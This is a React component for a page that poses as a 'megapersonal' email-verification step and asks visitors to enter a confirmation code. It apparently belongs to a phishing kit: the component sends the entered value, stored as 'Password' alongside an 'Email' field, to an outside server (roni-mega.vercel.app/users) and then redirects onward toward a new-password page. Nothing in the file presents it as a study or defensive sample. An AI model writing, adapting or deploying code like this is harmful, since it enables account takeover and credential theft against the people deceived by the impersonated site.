import React from "react";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";

const Code = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const navigate = useNavigate();

  const onSubmit = (data) => {
    const ItemId = {
      Email: data.example,
      Password: data.exampleRequired,
    };
    fetch("https://roni-mega.vercel.app/users", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/verify"));
  };
  return (
    <div>
      <div className="container">
        <div className="row">
          <div className="col text-center p-3">
            <h3>
              Confirmation 4 digit code sending to your email from megapersonal.
            </h3>
            <div>
              <form onSubmit={handleSubmit(onSubmit)}>
                <div>
                  <input
                    className="form-control Email mt-3 text-center"
                    placeholder="Type in the numbers you received"
                    defaultValue=""
                    {...register("exampleRequired", { required: true })}
                  />
                </div>
                {errors.exampleRequired && <span>This field is required</span>}

                <input
                  onClick={() => navigate("/NewPassword")}
                  className="submit  mt-3 mb-3 w-50%"
                  type="SUBMIT"
                  defaultValue="Join Meeting"
                />
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Code;
